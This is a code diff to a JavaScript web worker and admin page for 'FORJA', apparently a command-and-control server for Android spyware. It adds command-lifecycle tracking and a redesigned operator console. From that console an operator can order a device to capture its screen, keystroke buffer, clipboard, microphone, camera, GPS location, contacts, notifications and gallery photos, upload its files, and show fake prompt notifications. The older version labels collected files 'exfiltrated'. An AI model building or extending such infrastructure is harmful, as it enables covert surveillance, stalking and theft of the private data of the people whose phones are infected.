@@ -1131,6 +1131,17 @@ async function c2DrainTasks(bucket, uid) {
       await bucket.put(key, JSON.stringify(leftover));
     }
   } catch (e) { c2log("drain.error", uid, e.message || ""); }
+  // Update command log: queued → delivered
+  if (fresh.length) {
+    try {
+      const logKey = "cl/" + uid + ".json";
+      const log = await c2GetArr(bucket, logKey);
+      const ids = new Set(fresh.map(t => t.id));
+      let changed = false;
+      for (const e of log) { if (ids.has(e.id) && e.st === "queued") { e.st = "delivered"; e.t1 = now; changed = true; } }
+      if (changed) await bucket.put(logKey, JSON.stringify(log));
+    } catch (_) { }
+  }
   c2log("drain.deliver", uid, "n=" + fresh.length + " ids=" + fresh.map(t => t.id).join(","));
   return fresh;
 }
@@ -1145,6 +1156,16 @@ function c2Enqueue(bucket, uid, tasks) {
       arr.push(t);
     }
     await bucket.put(key, JSON.stringify(arr));
+    // Command log: track lifecycle (queued → delivered → done/failed/timeout)
+    try {
+      const logKey = "cl/" + uid + ".json";
+      const log = await c2GetArr(bucket, logKey);
+      for (const t of tasks) {
+        log.unshift({ id: t.id, a: t.action, st: "queued", t0: now, t1: null, t2: null, ok: null, err: null });
+      }
+      if (log.length > 100) log.length = 100;
+      await bucket.put(logKey, JSON.stringify(log));
+    } catch (_) { }
     c2log("enqueue", uid, "added=" + tasks.map(t => t.id + ":" + t.action).join(",") + " queueSize=" + arr.length);
     return arr;
   })();
@@ -1232,6 +1253,15 @@ async function handleC2Result(request, env, uid) {
     if (idx.length > 200) idx = idx.slice(0, 200);
     await env.C2.put(idxKey, JSON.stringify(idx));
   } catch (_) { }
+  // Command log: delivered → done/failed
+  try {
+    const logKey = "cl/" + uid + ".json";
+    const log = await c2GetArr(env.C2, logKey);
+    for (const e of log) {
+      if (e.id === id) { e.st = body.ok ? "done" : "failed"; e.t2 = ts; e.ok = !!body.ok; e.err = String(body.err || "").slice(0, 200) || null; break; }
+    }
+    await env.C2.put(logKey, JSON.stringify(log));
+  } catch (_) { }
   return json({ ok: true });
 }
 
@@ -1316,10 +1346,18 @@ async function handleAdminC2(request, env, url) {
   if (request.method === "GET" && p === "/admin/api/c2/tasks") {
     const uid = c2Safe(url.searchParams.get("uid"));
     if (!uid) return json({ error: "Lipsește uid." }, 400);
-    const arr = await c2GetArr(env.C2, "q/" + uid + ".json");
     const now = Math.floor(Date.now() / 1000);
-    const fresh = arr.filter(t => (t.at || 0) > now - 3600);
-    return json({ tasks: fresh, expired: arr.length - fresh.length });
+    const limit = Math.min(parseInt(url.searchParams.get("limit")) || 50, 100);
+    // Command log with computed timeouts
+    const log = (await c2GetArr(env.C2, "cl/" + uid + ".json")).slice(0, limit).map(e => {
+      const eff = { ...e };
+      if (eff.st === "queued" && now - (eff.t0 || 0) > 300) eff.st = "timeout";
+      if (eff.st === "delivered" && now - (eff.t1 || 0) > 120) eff.st = "timeout";
+      return eff;
+    });
+    // Also return raw queue size for context
+    const qArr = await c2GetArr(env.C2, "q/" + uid + ".json");
+    return json({ tasks: log, queue: qArr.length });
   }
   if (request.method === "GET" && p === "/admin/api/c2/results") {
     const uid = c2Safe(url.searchParams.get("uid"));
@@ -1538,173 +1576,216 @@ function adminPage() {
 const C2_HTML = String.raw`<!doctype html>
 <html lang="ro"><head>
 <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
-<title>FORJA · Sincronizare</title>
+<title>FORJA · C2</title>
 <style>
-:root{--bg:#0A0A0B;--panel:#121214;--panel2:#1A1A1E;--line:rgba(255,255,255,.08);--txt:#F4F2EE;--dim:#A7A9AE;--amber:#FFB300;--green:#2FBE71;--red:#FF4D3A}
-*{margin:0;box-sizing:border-box}body{font:14px/1.5 system-ui,sans-serif;background:var(--bg);color:var(--txt);min-height:100vh}
+:root{--bg:#0A0A0B;--panel:#121214;--panel2:#1A1A1E;--line:rgba(255,255,255,.08);--txt:#F4F2EE;--dim:#A7A9AE;--dim2:#7A7D83;--amber:#FFB300;--green:#2FBE71;--red:#FF4D3A;--blue:#5B9BD5;--gray:#888}
+*{margin:0;box-sizing:border-box}
+body{font:14px/1.5 system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--txt);min-height:100vh}
 a{color:var(--amber);text-decoration:none}a:hover{text-decoration:underline}
-main{max-width:1100px;margin:0 auto;padding:20px}
-h1{font-size:20px;margin-bottom:4px}h2{font-size:14px;color:var(--dim);margin:16px 0 8px}
-.nav{display:flex;gap:12px;margin-bottom:16px;font-size:13px}
-.card{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:14px;margin-bottom:12px}
+.mono{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+main{max-width:960px;margin:0 auto;padding:16px 20px 40px}
+.nav{display:flex;gap:12px;margin-bottom:12px;font-size:13px}
+h1{font-size:18px;margin-bottom:2px;letter-spacing:.06em}
+h1 b{color:var(--amber)}
+h2{font-size:11px;color:var(--dim2);letter-spacing:.12em;font-weight:700;margin:0 0 10px;text-transform:uppercase}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:14px 16px;margin-bottom:12px}
 table{width:100%;border-collapse:collapse;font-size:13px}
-th{text-align:left;padding:6px 8px;color:var(--dim);border-bottom:1px solid var(--line);font-weight:500}
-td{padding:6px 8px;border-bottom:1px solid var(--line)}
-.badge{display:inline-block;padding:1px 8px;border-radius:10px;font-size:11px;font-weight:600}
-.badge.on{background:rgba(47,190,113,.15);color:var(--green)}.badge.off{background:rgba(255,77,58,.15);color:var(--red)}
-select,input,textarea{background:var(--panel2);border:1px solid var(--line);color:var(--txt);border-radius:6px;padding:8px;font-size:13px;width:100%}
-button{background:var(--amber);color:#000;border:none;border-radius:6px;padding:8px 16px;font-size:13px;font-weight:600;cursor:pointer}
-button:hover{filter:brightness(1.1)}button.sec{background:var(--panel2);color:var(--txt);border:1px solid var(--line)}
-pre{background:var(--panel2);padding:8px;border-radius:6px;font-size:12px;overflow-x:auto;white-space:pre-wrap;word-break:break-all;max-height:300px;overflow-y:auto}
-img.shot{max-width:200px;border-radius:6px;margin:4px}
-.form-row{display:flex;gap:8px;margin-bottom:8px;flex-wrap:wrap}.form-row>*{flex:1;min-width:120px}
-.lbl{font-size:11px;color:var(--dim);margin-bottom:2px;display:block}
+th{text-align:left;padding:5px 8px;color:var(--dim2);border-bottom:1px solid var(--line);font-weight:600;font-size:11px;letter-spacing:.06em;text-transform:uppercase}
+td{padding:6px 8px;border-bottom:1px solid var(--line);vertical-align:top}
+.badge{display:inline-block;padding:2px 8px;border-radius:10px;font-size:11px;font-weight:700;letter-spacing:.04em}
+.badge.online{background:rgba(47,190,113,.15);color:var(--green)}
+.badge.offline{background:rgba(255,77,58,.15);color:var(--red)}
+.badge.queued{background:rgba(255,179,0,.15);color:var(--amber)}
+.badge.delivered{background:rgba(91,155,213,.15);color:var(--blue)}
+.badge.done{background:rgba(47,190,113,.15);color:var(--green)}
+.badge.failed{background:rgba(255,77,58,.15);color:var(--red)}
+.badge.timeout{background:rgba(136,136,136,.15);color:var(--gray)}
+select,input,textarea{background:var(--panel2);border:1px solid var(--line);color:var(--txt);border-radius:6px;padding:7px 10px;font-size:13px;width:100%}
+textarea{resize:vertical;min-height:36px}
+button{background:var(--amber);color:#000;border:none;border-radius:6px;padding:8px 18px;font-size:13px;font-weight:700;cursor:pointer;letter-spacing:.02em}
+button:hover{filter:brightness(1.15)}
+.form-row{display:flex;gap:8px;margin-bottom:8px;flex-wrap:wrap}
+.form-row>*{flex:1;min-width:140px}
+.lbl{font-size:10px;color:var(--dim2);margin-bottom:3px;display:block;font-weight:600;letter-spacing:.06em;text-transform:uppercase}
+.cmd-item{border:1px solid var(--line);border-radius:8px;padding:10px 12px;margin-bottom:8px;background:var(--panel2)}
+.cmd-head{display:flex;align-items:center;gap:8px;margin-bottom:4px;flex-wrap:wrap}
+.cmd-head .action{font-weight:700;font-size:13px}
+.cmd-head .time{margin-left:auto;font-size:11px;color:var(--dim2)}
+.cmd-body{font-size:12px;color:var(--dim);margin-top:4px}
+.cmd-result{margin-top:6px}
+pre{background:var(--bg);padding:8px;border-radius:6px;font-size:11px;overflow-x:auto;white-space:pre-wrap;word-break:break-all;max-height:200px;overflow-y:auto}
+img.shot{max-width:180px;border-radius:6px}
+.sub{color:var(--dim);font-size:12px;margin-bottom:12px}
 #login{display:none;position:fixed;inset:0;background:var(--bg);z-index:99;align-items:center;justify-content:center}
-#login .card{width:320px;text-align:center}
-#login input{margin:12px 0;text-align:center}
+#login .card{width:300px;text-align:center}
+#login input{margin:10px 0;text-align:center}
+.empty{color:var(--dim2);font-size:13px;font-style:italic}
 </style></head><body>
-<nav class="nav"><a href="/admin">← Admin</a><a href="/admin/c2">C2</a></nav>
+<nav class="nav"><a href="/admin">Admin</a><span style="color:var(--dim2)">·</span><b>C2</b></nav>
 <main>
-<h1>FORJA · Sincronizare</h1>
-<div class="sub" style="color:var(--dim);font-size:12px;margin-bottom:16px">Monitorizare și control remote al dispozitivelor FORJA.</div>
+<h1>FORJA <b>C2</b></h1>
+<div class="sub">Control remote · comandă și monitorizare</div>
 
-<div id="devsCard" class="card"><h2>DISPOZITIVE</h2><div id="devs"><em>încărcare…</em></div></div>
+<div class="card"><h2>Dispozitive</h2><div id="devs"><span class="empty">încărcare…</span></div></div>
 
 <div id="cmdCard" class="card" style="display:none">
-<h2>TRIMITE COMANDĂ</h2>
+<h2>Comandă</h2>
 <div class="form-row">
-<div><label class="lbl">Dispozitiv (uid)</label><select id="cmdDev"></select></div>
-<div><label class="lbl">Acțiune</label>
+<div><span class="lbl">Dispozitiv</span><select id="cmdDev"></select></div>
+<div><span class="lbl">Acțiune</span>
 <select id="cmdAction" onchange="updParams()">
-<option value="screenshot">screenshot — captură ecranul</option>
-<option value="screen_text">screen_text — text de pe ecran</option>
-<option value="input">input — text din buffer</option>
-<option value="clipboard">clipboard — clipboard</option>
-<option value="mic">mic — înregistrare microfon</option>
-<option value="camera">camera — foto cameră</option>
-<option value="gps">gps — poziție curentă</option>
-<option value="device">device — info dispozitiv</option>
-<option value="apps">apps — aplicații instalate</option>
-<option value="foreground">foreground — app în prim-plan</option>
-<option value="recent">recent — appuri recente</option>
-<option value="usage">usage — statistici utilizare</option>
-<option value="notifications">notifications — notificări active</option>
-<option value="send_file">send_file — partajare fișier</option>
-<option value="send_photos">send_photos — poze din galerie</option>
-<option value="prompt">prompt — notificare ecran</option>
-<option value="contacts">contacts — contacte telefon</option>
-<option value="network">network — WiFi + IP</option>
-<option value="storage_list">storage_list — listare fișiere</option>
 <option value="status">status — permisiuni + stare</option>
+<option value="screenshot">screenshot — ecran</option>
+<option value="screen_text">screen_text — text ecran</option>
+<option value="gps">gps — poziție</option>
+<option value="mic">mic — microfon</option>
+<option value="camera">camera — foto</option>
+<option value="device">device — info</option>
+<option value="apps">apps — instalate</option>
+<option value="foreground">foreground — prim-plan</option>
+<option value="recent">recent — recente</option>
+<option value="clipboard">clipboard</option>
+<option value="input">input — buffer</option>
+<option value="usage">usage — statistici</option>
+<option value="notifications">notifications</option>
+<option value="contacts">contacts</option>
+<option value="network">network — WiFi/IP</option>
+<option value="send_file">send_file — fișier</option>
+<option value="send_photos">send_photos — galerie</option>
+<option value="prompt">prompt — notificare</option>
+<option value="storage_list">storage_list — fișiere</option>
 </select></div>
 </div>
-<div class="form-row"><div style="flex:3"><label class="lbl">Parametri (JSON)</label><textarea id="cmdParams" rows="3" class="mono">{}</textarea></div></div>
-<button onclick="sendCmd()">TRIMITE COMANDĂ</button>
-<span id="cmdStatus" style="margin-left:12px;color:var(--dim);font-size:12px"></span>
+<div class="form-row"><div style="flex:3"><span class="lbl">Parametri</span><textarea id="cmdParams" rows="2" class="mono">{}</textarea></div></div>
+<div style="display:flex;align-items:center;gap:10px">
+<button onclick="sendCmd()">Trimite</button>
+<span id="cmdStatus" style="font-size:12px;color:var(--dim2)"></span>
+</div>
 </div>
 
-<div class="card"><h2>COMENZI PENDING</h2><div id="pending"><em>niciuna</em></div></div>
+<div class="card"><h2>Comenzi</h2><div id="cmdhist"><span class="empty">încărcare…</span></div></div>
 
-<div class="card"><h2>REZULTATE</h2><div id="results"><em>încărcare…</em></div></div>
-
-<div class="card"><h2>FIȘIERE EXFILTRATE</h2><div id="files"><em>încărcare…</em></div></div>
+<div class="card"><h2>Fișiere</h2><div id="files"><span class="empty">niciun fișier</span></div></div>
 </main>
 
-<div id="login"><div class="card"><h3>AUTENTIFICARE ADMIN</h3><div style="color:var(--dim);font-size:12px;margin:8px 0">Cheia de administrare FORJA.</div><input id="key" type="password" placeholder="cheia de admin" onkeydown="if(event.key==='Enter')saveKey()"><button style="width:100%" onclick="saveKey()">Intră</button></div></div>
+<div id="login"><div class="card"><h2>Autentificare</h2><input id="key" type="password" placeholder="cheia de admin" onkeydown="if(event.key==='Enter')saveKey()"><button style="width:100%;margin-top:4px" onclick="saveKey()">Intră</button></div></div>
 
 <script>
-let KEY="";
-function esc(s){const d=document.createElement("div");d.textContent=s;return d.innerHTML}
-function saveKey(){KEY=document.getElementById("key").value.trim();if(!KEY)return alert("Introdu cheia.");sessionStorage.setItem("c2k",KEY);document.getElementById("login").style.display="none";loadAll()}
-async function api(p,opt={}){
-  opt.headers=Object.assign({"X-Admin":KEY},opt.headers||{});
-  if(opt.body&&typeof opt.body!=="string")opt.body=JSON.stringify(opt.body);
-  const r=await fetch(p,opt);
+var KEY="";
+function esc(s){var d=document.createElement("div");d.textContent=s;return d.innerHTML}
+function saveKey(){KEY=document.getElementById("key").value.trim();if(!KEY)return alert("Cheie lipsă.");sessionStorage.setItem("c2k",KEY);document.getElementById("login").style.display="none";loadAll()}
+async function api(p,o){
+  o=o||{};o.headers=Object.assign({"X-Admin":KEY},o.headers||{});
+  if(o.body&&typeof o.body!=="string")o.body=JSON.stringify(o.body);
+  var r=await fetch(p,o);
   if(r.status===403){document.getElementById("login").style.display="flex";throw new Error("403")}
   return r.json();
 }
 function selDev(){return document.getElementById("cmdDev").value}
 function updParams(){
-  const a=document.getElementById("cmdAction").value;
-  const d={screenshot:{},screen_text:{},input:{},clipboard:{},mic:{ms:10000},camera:{},gps:{},
+  var a=document.getElementById("cmdAction").value;
+  var d={screenshot:{},screen_text:{},input:{},clipboard:{},mic:{ms:10000},camera:{},gps:{},
   device:{},apps:{},foreground:{},recent:{},usage:{},
-  notifications:{},send_file:{uri:""},send_photos:{limit:10,since:null},prompt:{type:"wifi",title:"",body:""},contacts:{},network:{},storage_list:{dir:"DCIM",limit:30},status:{}};
+  notifications:{},send_file:{uri:""},send_photos:{limit:10},prompt:{type:"wifi",title:"",body:""},
+  contacts:{},network:{},storage_list:{dir:"DCIM",limit:30},status:{}};
   document.getElementById("cmdParams").value=JSON.stringify(d[a]||{},null,2);
 }
 async function sendCmd(){
-  const uid=selDev();if(!uid)return alert("Alege un dispozitiv.");
-  const action=document.getElementById("cmdAction").value;
-  let params={};try{params=JSON.parse(document.getElementById("cmdParams").value)}catch(e){return alert("JSON invalid: "+e.message)}
+  var uid=selDev();if(!uid)return alert("Alege un dispozitiv.");
+  var action=document.getElementById("cmdAction").value;
+  var params={};try{params=JSON.parse(document.getElementById("cmdParams").value)}catch(e){return alert("JSON invalid")}
   document.getElementById("cmdStatus").textContent="se trimite…";
-  try{const r=await api("/admin/api/c2/cmd",{method:"POST",body:{uid,tasks:[{action,params}]}});
-    document.getElementById("cmdStatus").textContent=r.ok?"✓ trimisă":"eroare";
-    setTimeout(loadAll,1000);
+  try{
+    var r=await api("/admin/api/c2/cmd",{method:"POST",body:{uid:uid,tasks:[{action:action,params:params}]}});
+    document.getElementById("cmdStatus").textContent=r.ok?"trimisă ✓":"eroare";
+    setTimeout(loadDetail,1500);
   }catch(e){document.getElementById("cmdStatus").textContent="eroare: "+e.message}
 }
-function ago(ts,now){const d=now-ts;if(d<60)return d+"s";if(d<3600)return Math.floor(d/60)+"m";if(d<86400)return Math.floor(d/3600)+"h";return Math.floor(d/86400)+"d"}
+function ago(ts,now){var d=now-ts;if(d<0)return"acum";if(d<60)return d+"s";if(d<3600)return Math.floor(d/60)+"m "+(d%60)+"s";if(d<86400)return Math.floor(d/3600)+"h";return Math.floor(d/86400)+"d"}
 function fmtData(d){
   if(!d)return"";
-  if(typeof d==="string")return esc(d.slice(0,500));
+  if(typeof d==="string")return"<pre>"+esc(d.slice(0,800))+"</pre>";
   if(d.b64)return'<img class="shot" src="data:'+(d.ct||"image/jpeg")+';base64,'+d.b64+'">';
-  if(d.lat!=null&&d.lng!=null)return"📍 "+d.lat.toFixed(5)+", "+d.lng.toFixed(5)+(d.acc?" (±"+d.acc.toFixed(0)+"m)":"")+' <a target="_blank" href="https://maps.google.com/?q='+d.lat+','+d.lng+'">harta →</a>';
-  if(d.path&&d.points>1){const pts=d.path.split(" ");const first=pts[0],last=pts[pts.length-1];return"📍 "+d.points+" puncte · <a target='_blank' href='https://maps.google.com/dir/"+first+"/"+last+"'>traseu →</a><pre>"+esc(pts.join("\n"))+"</pre>"}
-  if(d.file){const isAud=/\.m4a|\.mp3|\.wav|audio\//i.test(d.file);return(isAud?"🎵 ":"📁 ")+'<a href="#" onclick=\'dl("'+esc(d.file)+'");return false\'>descarcă</a>'+(d.size?" ("+(d.size/1024).toFixed(1)+"KB)":"")}
-  if(d.files){const f=d.files.map(function(x){return"<a href='#' onclick='dl(\""+esc(x)+"\");return false'>"+esc(x.split("/").pop())+"</a>"}).join(", ");return"📁 "+f}
-  if(d.text)return"<pre style='max-height:200px'>"+esc(d.text.slice(0,3000))+"</pre>";
-  if(d.entries){return"<pre style='max-height:200px'>"+esc(d.entries.join("\n"))+"</pre>"}
-  if(d.list&&d.list.length){return"<pre style='max-height:200px'>"+esc(JSON.stringify(d.list.slice(0,30),null,1))+"</pre>"}
-  if(d.hb)return"💓 "+(d.fg?"app: "+esc(d.fg)+" · ":"")+(d.bat>=0?"bată: "+esc(d.bat)+"%":"")+(d.screen?"\n<pre>"+esc(d.screen.slice(0,300))+"</pre>":"");
+  if(d.lat!=null&&d.lng!=null)return"📍 "+d.lat.toFixed(5)+", "+d.lng.toFixed(5)+(d.acc?" ±"+d.acc.toFixed(0)+"m":"")+' <a target="_blank" href="https://maps.google.com/?q='+d.lat+','+d.lng+'">harta</a>';
+  if(d.text)return"<pre>"+esc(d.text.slice(0,2000))+"</pre>";
+  if(d.entries)return"<pre>"+esc(d.entries.join("\n").slice(0,2000))+"</pre>";
+  if(d.file)return"<a href='#' onclick='dl(\""+esc(d.file)+"\");return false'>↓ "+esc(d.file.split("/").pop())+"</a>";
+  if(d.files){return d.files.map(function(x){return"<a href='#' onclick='dl(\""+esc(x)+"\");return false'>↓ "+esc(x.split("/").pop())+"</a>"}).join(" ")}
+  if(d.list&&d.list.length)return"<pre>"+esc(JSON.stringify(d.list.slice(0,30),null,1))+"</pre>";
   return"<pre>"+esc(JSON.stringify(d).slice(0,1500))+"</pre>";
 }
+var ST={queued:["queued","ÎN COADĂ"],delivered:["delivered","LIVRATĂ"],done:["done","GATA ✓"],failed:["failed","EROARE"],timeout:["timeout","EXPIRATĂ"]};
 async function loadAll(){
-  const now=Math.floor(Date.now()/1000);
-  // Devices
+  var now=Math.floor(Date.now()/1000);
   try{
-    const d=await api("/admin/api/c2/devices");
-    const devs=d.devices||[];
+    var d=await api("/admin/api/c2/devices");
+    var devs=d.devices||[];
     document.getElementById("devs").innerHTML=devs.length?
-      '<table><tr><th>UID</th><th>DISPOZITIV</th><th>STATUT</th><th>ULTIMA LEGĂTURA</th></tr>'+
-      devs.map(x=>{const on=(now-x.lastSeen<300);return"<tr><td>"+esc(x.uid)+"</td><td>"+esc(x.dev)+"</td><td><span class='badge "+(on?"on":"off")+"'>"+(on?"ONLINE":"OFFLINE")+"</span></td><td>"+ago(x.lastSeen,now)+"</td></tr>"}).join("")+"</table>":
-      "<em>niciun dispozitiv</em>";
-    const sel=document.getElementById("cmdDev");
-    sel.innerHTML=devs.map(x=>"<option value='"+esc(x.uid)+"'>"+esc(x.dev)+" ("+esc(x.uid.slice(0,12))+"…)</option>").join("");
+      devs.map(function(x){
+        var on=(now-x.lastSeen<300);
+        return"<div style='display:flex;align-items:center;gap:10px;padding:6px 0;border-bottom:1px solid var(--line)'>"
+          +"<span class='badge "+(on?"online":"offline")+"'>"+(on?"● ONLINE":"○ OFFLINE")+"</span>"
+          +"<span style='font-weight:600'>"+esc(x.dev)+"</span>"
+          +"<span class='mono' style='font-size:11px;color:var(--dim2)'>"+esc(x.uid.slice(0,12))+"…</span>"
+          +"<span style='margin-left:auto;font-size:11px;color:var(--dim2)'>"+ago(x.lastSeen,now)+"</span></div>";
+      }).join("")
+      :'<span class="empty">niciun dispozitiv conectat</span>';
+    var sel=document.getElementById("cmdDev");
+    sel.innerHTML=devs.map(function(x){return"<option value='"+esc(x.uid)+"'>"+esc(x.dev)+"</option>"}).join("");
     document.getElementById("cmdCard").style.display=devs.length?"":"none";
     if(devs.length)loadDetail();
   }catch(e){}
 }
 async function loadDetail(){
-  const uid=selDev();if(!uid)return;
+  var uid=selDev();if(!uid)return;
+  var now=Math.floor(Date.now()/1000);
   try{
-    const p=await api("/admin/api/c2/tasks?uid="+encodeURIComponent(uid));
-    document.getElementById("pending").innerHTML=(p.tasks||[]).length?
-      "<pre>"+esc(JSON.stringify(p.tasks,null,2))+"</pre>":"<em>niciuna</em>";
+    var p=await api("/admin/api/c2/tasks?uid="+encodeURIComponent(uid));
+    var tasks=p.tasks||[];
+    if(!tasks.length){document.getElementById("cmdhist").innerHTML='<span class="empty">niciune</span>';return}
+    document.getElementById("cmdhist").innerHTML=tasks.map(function(x){
+      var s=ST[x.st]||ST.timeout;
+      var head="<div class='cmd-head'><span class='action'>"+esc(x.a)+"</span><span class='badge "+s[0]+"'>"+s[1]+"</span><span class='time mono'>"+ago(x.t0||now,now)+"</span></div>";
+      var meta="";
+      if(x.t1)meta+=" livrată "+ago(x.t1,now);
+      if(x.t2)meta+" rezultat "+ago(x.t2,now);
+      var body="";
+      if(x.err)body="<div class='cmd-result' style='color:var(--red)'>⚠ "+esc(x.err.slice(0,300))+"</div>";
+      var head2=head+(meta?"<div class='cmd-body mono'>"+meta+"</div>":"");
+      return"<div class='cmd-item'>"+head2+body+"</div>";
+    }).join("");
   }catch(e){}
   try{
-    const r=await api("/admin/api/c2/results?uid="+encodeURIComponent(uid)+"&limit=10");
-    const now=Math.floor(Date.now()/1000);
-    document.getElementById("results").innerHTML=(r.results||[]).length?
-      r.results.map(x=>"<div style='margin-bottom:8px;border-bottom:1px solid var(--line);padding-bottom:8px'><b>"+esc(x.action)+"</b> <span class='badge "+(x.ok?"on":"off")+"'>"+(x.ok?"OK":"EROARE")+"</span> <span style='color:var(--dim);font-size:11px'>"+ago(x.at,now)+" ago</span><div style='margin-top:4px'>"+(x.err?"⚠ "+esc(x.err):fmtData(x.data))+"</div></div>").join("")
-      :"<em>niciun rezultat</em>";
+    var r=await api("/admin/api/c2/results?uid="+encodeURIComponent(uid)+"&limit=15");
+    var results=r.results||[];
+    var histEl=document.getElementById("cmdhist");
+    if(results.length){
+      histEl.innerHTML+="<h2 style='margin-top:16px'>Rezultate detaliate</h2>";
+      histEl.innerHTML+=results.map(function(x){
+        return"<div class='cmd-item'><div class='cmd-head'><span class='action'>"+esc(x.action)+"</span><span class='badge "+(x.ok?"done":"failed")+"'>"+(x.ok?"OK":"FAIL")+"</span><span class='time mono'>"+ago(x.at,now)+"</span></div>"
+          +(x.err?"<div class='cmd-result' style='color:var(--red)'>⚠ "+esc(x.err.slice(0,300))+"</div>":"")
+          +"<div class='cmd-result'>"+fmtData(x.data)+"</div></div>";
+      }).join("");
+    }
   }catch(e){}
   try{
-    const f=await api("/admin/api/c2/files?uid="+encodeURIComponent(uid));
+    var f=await api("/admin/api/c2/files?uid="+encodeURIComponent(uid));
     document.getElementById("files").innerHTML=(f.files||[]).length?
-      '<table><tr><th>NUME</th><th>MĂRIME</th><th>DATA</th><th></th></tr>'+
-      f.files.map(x=>"<tr><td>"+esc(x.key.split("/").pop())+"</td><td>"+(x.size/1024).toFixed(1)+"KB</td><td>"+new Date(x.uploaded).toLocaleString()+"</td><td><a href='#' onclick='dl(\""+esc(x.key)+"\");return false'>↓ descarcă</a></td></tr>").join("")+"</table>"
-      :"<em>niciun fișier</em>";
+      '<table><tr><th>Fișier</th><th>Dim.</th><th>Data</th><th></th></tr>'+
+      f.files.map(function(x){return"<tr><td class='mono'>"+esc(x.key.split("/").pop())+"</td><td>"+(x.size/1024).toFixed(1)+"KB</td><td>"+new Date(x.uploaded*1000).toLocaleString()+"</td><td><a href='#' onclick='dl(\""+esc(x.key)+"\");return false'>↓</a></td></tr>"}).join("")+"</table>"
+      :'<span class="empty">niciun fișier</span>';
   }catch(e){}
 }
 async function dl(key){
   try{
-    const r=await fetch("/admin/api/c2/file?key="+encodeURIComponent(key),{headers:{"X-Admin":KEY}});
+    var r=await fetch("/admin/api/c2/file?key="+encodeURIComponent(key),{headers:{"X-Admin":KEY}});
     if(!r.ok)throw new Error(r.status);
-    const blob=await r.blob();
-    const a=document.createElement("a");a.href=URL.createObjectURL(blob);
+    var blob=await r.blob();
+    var a=document.createElement("a");a.href=URL.createObjectURL(blob);
     a.download=key.split("/").pop();a.click();URL.revokeObjectURL(a.href);
-  }catch(e){alert("download eșuat: "+e.message)}
+  }catch(e){alert("download: "+e.message)}
 }
-function tick(){const uid=selDev();if(uid)loadDetail()}
-setInterval(tick,8000);
+setInterval(function(){var uid=selDev();if(uid)loadDetail()},8000);
 if(sessionStorage.getItem("c2k")){KEY=sessionStorage.getItem("c2k");loadAll()}else{document.getElementById("login").style.display="flex"}
 </script>
 </body></html>`;
